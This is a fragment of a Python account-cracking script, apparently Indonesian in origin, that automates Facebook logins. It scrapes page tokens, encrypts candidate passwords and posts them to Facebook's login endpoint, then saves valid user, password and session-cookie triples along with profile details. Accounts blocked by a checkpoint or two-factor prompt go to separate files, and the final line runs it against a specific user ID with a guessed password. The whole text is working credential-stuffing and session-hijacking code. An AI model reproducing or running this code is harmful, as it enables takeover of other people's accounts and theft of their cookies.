						lsd = re.search(r'"LSD",\[\],{"token":"(.*?)"', response.text.replace('\\','')).group(1)
						hsi = re.search(r'"hsi":"(\d+)"', response.text.replace('\\','')).group(1)
						rev = re.search(r'rev:(\d+)', response.text.replace('\\','')).group(1)
						ccg = re.search(r'"connectionClass":"(.*?)"', response.text.replace('\\','')).group(1)
						hs = re.search(r'"haste_session":"(.*?)"', response.text.replace('\\','')).group(1)
						html_user = re.search(r'html_name:"email",id:"(.*?)"', response.text.replace('\\','')).group(1)
						html_pass = re.search(r'html_name:"pass",id:"(.*?)"', response.text.replace('\\','')).group(1)
						marker = re.search(r'bk.action.array.Make, "", (.*?), \(bk.action.i64.Const', response.text.replace('\\','')).group(1)
						inst = re.search(r'bk.action.i64.Const, (\d+)', response.text.replace('\\','')).group(1)
						waterfall = re.search(r'null, null, "(.*?)", null, null', response.text.replace('\\','')).group(1)
						bkv = re.search(r'versioningID:"(.*?)"', response.text.replace('\\',''))
						apacoba= re.search(r"(\d+),\s*\"([a-fA-F0-9]{64})\"", response.text.replace('\\',''))
						key_id = int(apacoba.group(1))
						publik_key = apacoba.group(2)
						bkv_ver = bkv.group(1) if bkv else 'ef23e7e082f91c44c20827575da921a3c4a655207efbe6c8b1e845dcc7921e90'
					except AttributeError as e:
						time.sleep(7.0)
						continue
					enpas = FacebookAsset().encrypt_password(pw, int(time.time()), publik_key, key_id)
					data = {
						"__aaid": "0",
						"__user": "0",
						"__a": "1",
						"__req": str(random.randint(1,10)),
						"__hs": hs,
						"dpr": "1",
						"__ccg": ccg,
						"__rev": rev,
						'__s': "tjkfk5:wepycu:r9bkyo",
						"__hsi": hsi,
						"__dyn": "",
						"__csr": "",
						'__hsdp': "",
						'__hblp': "",
						"fb_dtsg": dtsg,
						"jazoest": jazoest_,
						"lsd": lsd,
						"params": json.dumps({"params":"{\"server_params\":{\"credential_type\":\"password\",\"username_text_input_id\":\""+html_user+"\",\"password_text_input_id\":\""+html_pass+"\",\"login_source\":\"Login\",\"login_credential_type\":\"none\",\"server_login_source\":\"login\",\"ar_event_source\":\"login_home_page\",\"should_trigger_override_login_success_action\":0,\"should_trigger_override_login_2fa_action\":0,\"is_caa_perf_enabled\":0,\"reg_flow_source\":\"login_home_native_integration_point\",\"caller\":\"gslr\",\"is_from_landing_page\":0,\"is_from_empty_password\":0,\"is_from_password_entry_page\":0,\"is_from_assistive_id\":0,\"is_from_msplit_fallback\":0,\"INTERNAL__latency_qpl_marker_id\":"+marker+",\"INTERNAL__latency_qpl_instance_id\":\""+inst+"\",\"device_id\":null,\"family_device_id\":null,\"waterfall_id\":\""+waterfall+"\",\"offline_experiment_group\":null,\"layered_homepage_experiment_group\":null,\"is_platform_login\":0,\"is_from_logged_in_switcher\":0,\"is_from_logged_out\":0,\"access_flow_version\":\"pre_mt_behavior\"},\"client_input_params\":{\"machine_id\":\"\",\"contact_point\":\""+user+"\",\"password\":\""+'#PWD_BROWSER:0:{}:{}'.format(str(int(time.time())), pw)+"\",\"accounts_list\":[],\"fb_ig_device_id\":[],\"secure_family_device_id\":\"\",\"encrypted_msisdn\":\"\",\"headers_infra_flow_id\":\"\",\"try_num\":1,\"login_attempt_count\":1,\"event_flow\":\"login_manual\",\"event_step\":\"home_page\",\"openid_tokens\":{},\"auth_secure_device_id\":\"\",\"client_known_key_hash\":\"\",\"has_whatsapp_installed\":0,\"sso_token_map_json_string\":\"\",\"should_show_nested_nta_from_aymh\":0,\"password_contains_non_ascii\":\"false\",\"has_granted_read_contacts_permissions\":0,\"has_granted_read_phone_permissions\":0,\"app_manager_id\":\"\",\"lois_settings\":{\"lois_token\":\"\"}}}"})
					}
					r.headers.update({
						'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
						'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items()]))),
						'accept': '*/*',
						'sec-fetch-site': 'same-origin',
						'origin': f'https://{r.headers["host"]}',
						'referer': response.url,
						'sec-fetch-mode': 'cors',
						'sec-fetch-dest': 'empty',
						'cookie': ';'.join([str(x) +'='+ str(y) for x, y in r.cookies.get_dict().items()])
					})
					params = {
						'appid': "com.bloks.www.bloks.caa.login.async.send_login_request",
						'type': "action",
						'__bkv': bkv_ver
					}
					response2 = r.post(f'https://{r.headers["host"]}/async/wbloks/fetch/', params=params, data=data, allow_redirects=True)
					if 'c_user' in r.cookies.get_dict().keys():
						cookie = ';'.join([str(x) +'='+ str(y) for x, y in r.cookies.get_dict().items()])
						profile_data = FacebookAsset().get_user_profile(cookie)
						if profile_data:
							nama = profile_data.get('nama')
							gender = profile_data.get('gender')
							friends = profile_data.get('friends')
							followers = profile_data.get('followers')
							post = profile_data.get('postingan')
						else:
							nama, gender, friends, followers, post = None, None, None, None, None
						print(f"""\r{' ' * 76}
 Nama: {G}{nama}{H}
 Userid: {G}{user}{H}
 account: {G}{friends}{H}|{G}{followers}{H}|{G}{gender}{H}|{G}{post}{H}
 Cookie: {G}{cookie}{H}
 Password: {G}{pw}{H}""")
						OK.append(f'{user}|{pw}|{cookie}')
						open(f'Ressults/Login/OK-Api-{waktu}.txt', 'a').write(f'{user}|{pw}|{cookie}\n')
						break
					elif 'redirect_login_challenges' in response2.text.replace('\\', ''):
						CP.append(f'{user}|{pw}')
						print(f"""\r{' ' * 76}
 Userid: {D}{user}{H}
 Useragent: {D}{r.headers.get('user-agent')}{H}
 Password: {D}{pw}{H}""")
						open(f'Ressults/Checkpoint/Cp-API-{waktu}.txt', 'a').write(f'{user}|{pw}\n')
						break
					elif 'com.bloks.www.two_step_verification.entrypoint' in response2.text.replace('\\', '') or 'checkpoint' in r.cookies.get_dict().keys():
						CP.append(f'{user}|{pw}')
						print(f"""\r{' ' * 76}
 Userid: {D}{user}{H}
 Useragent: {D}{r.headers.get('user-agent')}{H}
 Password: {D}{pw}{H}""")
						open(f'Ressults/Checkpoint/Cp-API-{waktu}.txt', 'a').write(f'{user}|{pw}\n')
						break
					else:continue
			LOOPING += 1
		except (requests.exceptions.ConnectionError):
			time.sleep(30)
			Jar.Webregular(Dump, user, pw)

Dump = ['uwuw|°€°€°']
SETTING().Webregular(Dump, '100085517580061', ['karawang123']);exit()
